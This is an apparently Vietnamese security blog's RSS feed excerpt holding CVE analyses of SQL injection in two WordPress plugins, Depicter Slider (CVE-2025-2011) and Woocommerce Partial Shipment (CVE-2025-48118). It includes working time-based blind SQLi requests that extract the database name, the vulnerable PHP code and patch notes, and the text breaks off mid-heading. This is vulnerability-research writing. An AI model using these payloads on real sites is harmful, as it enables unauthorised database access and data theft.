0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Gửi &lt;strong&gt;GET request&lt;/strong&gt; chứa payload SQLi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=depicter-lead-list&amp;amp;s=999%25&amp;#39;&amp;#43;AND&amp;#43;(SELECT&amp;#43;1&amp;#43;FROM&amp;#43;(SELECT&amp;#43;SLEEP(5))a))&amp;#43;--&amp;#43;-&amp;#43; HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Payload được decode:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;999%&amp;#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- -&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi đó một phần của câu query trở thành&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;AND (lf.value like &amp;#39;999%&amp;#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- &amp;#39; OR leadtable.content_name like &amp;#39;999%&amp;#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/resp_time.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Thời gian phản hồi thể hiện payload hoạt động&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 Dựa trên thời gian phản hồi =&amp;gt; payload hoạt động.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Subquery trong mệnh đề FROM&lt;/strong&gt;: Truy vấn con được coi là bảng tạm thời. MySQL phải thực thi truy vấn con này đầu tiên để tạo bảng tạm thời, sau đó mới thực thi truy vấn chính.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Điều kiện tiên quyết để &lt;strong&gt;dump được hết data&lt;/strong&gt; là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được.&lt;/p&gt;&#xA;&lt;p&gt;Gửi request với &lt;strong&gt;SQLi payload&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=depicter-lead-list&amp;amp;s=999%25&amp;#39;&amp;#43;AND&amp;#43;(SELECT&amp;#43;1&amp;#43;FROM&amp;#43;(SELECT&amp;#43;IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))&amp;#43;--&amp;#43;-&amp;#43; HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sử dụng &lt;code&gt;SUBSTRING()&lt;/code&gt; để lấy ký tự đầu tiên của &lt;strong&gt;database name&lt;/strong&gt;, &lt;code&gt;IF()&lt;/code&gt; trả về &lt;code&gt;SLEEP(5)&lt;/code&gt; nếu ký tự đó là &lt;code&gt;0x77&lt;/code&gt;(&amp;lsquo;w&amp;rsquo;)&lt;/p&gt;&#xA;&lt;p&gt;Sử dụng hex encoding &lt;code&gt;w&lt;/code&gt; thành &lt;code&gt;0x77&lt;/code&gt; vì &lt;code&gt;s&lt;/code&gt; được lấy từ &lt;strong&gt;GET&lt;/strong&gt; request trong nên bị escape bởi &lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;magic quotes&lt;/a&gt; trong WordPress và bởi &lt;code&gt;sanitize_text_field&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;👉 Dựa trên thời gian phản hồi =&amp;gt; kí tự đầu tiên đúng là &lt;code&gt;w&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-2011&lt;/strong&gt; trong plugin WordPress &lt;strong&gt;Depicter Slider&lt;/strong&gt; trước phiên bản &lt;strong&gt;3.6.2&lt;/strong&gt;, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã &lt;strong&gt;escape SQL&lt;/strong&gt; khiến dữ liệu trước khi đưa vào trở thành chuỗi thuần không thể thoát ra khỏi &lt;code&gt;&#39;%...%&#39;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kiểm soát kỹ input từ người dùng.&lt;/li&gt;&#xA;&lt;li&gt;Luôn sử dụng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; khi làm việc với database trong WordPress để tránh SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Depicter Slider Plugin &amp;lt;= 3.6.1 is vulnerable to SQL Injection &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-48118 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-29-cve-2025-48118/</link>
      <pubDate>Mon, 29 Sep 2025 19:54:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-29-cve-2025-48118/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng xảy ra trên plugin &lt;strong&gt;Woocommerce Partial Shipment&lt;/strong&gt; của WordPress trước phiên bản &lt;strong&gt;3.3&lt;/strong&gt;. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-48118&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48118&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wc-partial-shipment/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Woocommerce Partial Shipment Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;:  High (8.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Woocommerce Partial Shipment&lt;/strong&gt;:  v3.2(vul) và v3.3(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Actived WooCommerce plugin&lt;/strong&gt;: plugin bắt buộc &lt;strong&gt;actived&lt;/strong&gt; trước khi cài &lt;strong&gt;Woocommerce Partial Shipment Plugin&lt;/strong&gt;, một số hàm trong &lt;strong&gt;WooCommerce&lt;/strong&gt; sẽ được sử dụng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ &lt;strong&gt;POST&lt;/strong&gt; request vào SQL query mà không có cơ chế kiểm soát chặt chẽ.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.&#xA;Có sự khác biệt rõ ở file &lt;strong&gt;wc-partial-shipment/woocommerce-partial-shipment.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nhưng ở đây, dev thay đổi khá nhiều ta khó để tìm được vị trí lỗi.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Trong WordPress, để SQLi xảy ra, ứng dụng phải tương tác với database thông qua biến global &lt;code&gt;$wpdb&lt;/code&gt;, ta search từ khóa này trong file &lt;strong&gt;wc-partial-shipment/woocommerce-partial-shipment.php&lt;/strong&gt; để tìm sink.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/search_sink.png&#34;&#xA;    alt=&#34;search sink&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả tìm vị trí sink trong mã nguồn&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;get_shipment_id&lt;/code&gt; và &lt;code&gt;get_wxp_shipment_data&lt;/code&gt; là 2 hàm thuộc class &lt;strong&gt;WXP_Partial_Shipment&lt;/strong&gt; đáng chú ý, dữ liệu được đưa thẳng vào câu query mà không có cơ chế kiểm soát nào. Do đó, lỗ hổng SQLi có thể xảy ra.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/patch.png&#34;&#xA;    alt=&#34;Patch&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;So sánh sự khác biệt giữa bản lỗi và bản vá&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Bản vá sử dụng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; để chuẩn bị câu query, thay vì &lt;strong&gt;nối trực tiếp dữ liệu từ người dùng&lt;/strong&gt;. Điều này đảm bảo rằng tất cả giá trị được &lt;strong&gt;escape đúng cách&lt;/strong&gt; trước khi chèn vào SQL, ngăn ngừa nguy cơ SQL Injection.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;get_shipment_id&lt;/code&gt; và &lt;code&gt;get_wxp_shipment_data&lt;/code&gt; đều được hàm &lt;code&gt;wxp_order_set_shipped&lt;/code&gt; trong cùng class gọi và sử dụng.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wxp_order_set_shipped(){&#xA;    $order_id = isset($_POST[&amp;#39;order_id&amp;#39;]) ? $_POST[&amp;#39;order_id&amp;#39;] : 0;&#xA;    // other logic&#xA;&#xA;    $wxp_shipment = $this-&amp;gt;get_wxp_shipment_data($order_id);&#xA;    if(isset($_POST[&amp;#39;order_id&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;order_id&amp;#39;]){&#xA;        global $wpdb;&#xA;        $shipment_id = $this-&amp;gt;get_shipment_id($_POST[&amp;#39;order_id&amp;#39;]);&#xA;        if(!$shipment_id){&#xA;            $data = array(&#xA;                &amp;#39;order_id&amp;#39; =&amp;gt;$order_id,&#xA;                &amp;#39;shipment_id&amp;#39; =&amp;gt;1,&#xA;                &amp;#39;shipment_url&amp;#39;=&amp;gt;&amp;#39;&amp;#39;,&#xA;                &amp;#39;shipment_num&amp;#39;=&amp;gt;&amp;#39;&amp;#39;,&#xA;                &amp;#39;shipment_date&amp;#39;=&amp;gt;current_time(&amp;#39;timestamp&amp;#39;,0),&#xA;            );&#xA;            $wpdb-&amp;gt;insert($wpdb-&amp;gt;prefix.&amp;#34;partial_shipment&amp;#34;,$data,array(&amp;#39;%d&amp;#39;,&amp;#39;%d&amp;#39;,&amp;#39;%s&amp;#39;,&amp;#39;%s&amp;#39;,&amp;#39;%s&amp;#39;));&#xA;            $shipment_id = $wpdb-&amp;gt;insert_id;&#xA;        }&#xA;    // other logic     &#xA;    }&#xA;&#xA;    echo json_encode(array(&amp;#39;order_id&amp;#39;=&amp;gt;$order_id,&amp;#39;status&amp;#39;=&amp;gt;$status_key));&#xA;    exit();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 &lt;code&gt;order_id&lt;/code&gt; được lấy từ &lt;strong&gt;POST request&lt;/strong&gt;, nơi người dùng có thể kiểm soát làm đối số khi gọi hàm &lt;code&gt;get_shipment_id&lt;/code&gt; và &lt;code&gt;get_wxp_shipment_data&lt;/code&gt;&#xA;truyền vào câu query chứa lổ hỗng SQLi.&lt;/p&gt;&#xA;&lt;p&gt;Để xác định nơi &lt;code&gt;wxp_order_set_shipped&lt;/code&gt; được gọi và sử dụng, ta tìm kiếm với từ khóa &lt;code&gt;wxp_order_set_shipped&lt;/code&gt; trong thư mục chứa plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/search_1.png&#34;&#xA;    alt=&#34;Search 1&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Tìm vị trí nơi hàm wxp_order_set_shipped được gọi&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;wxp_order_set_shipped&lt;/code&gt; được &lt;code&gt;construct&lt;/code&gt; của cùng class sử dụng làm callback cho hook &lt;code&gt;wp_ajax_wxp_order_set_shipped&lt;/code&gt; =&amp;gt; yêu cầu người dùng phải đăng nhập&lt;/p&gt;&#xA;&lt;p&gt;👉 Khi truy cập vào &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với tham số:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=wxp_order_set_shipped&amp;amp;order_id=payload_here&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Callback &lt;code&gt;wxp_order_set_shipped&lt;/code&gt; được gọi&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;order_id&lt;/code&gt; được lấy trực tiếp từ request và chèn vào SQL query.&lt;/li&gt;&#xA;&lt;li&gt;Query thực thi 2 lần do được truyền vào 2 hàm chạy lệnh SQL với payload độc hại.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 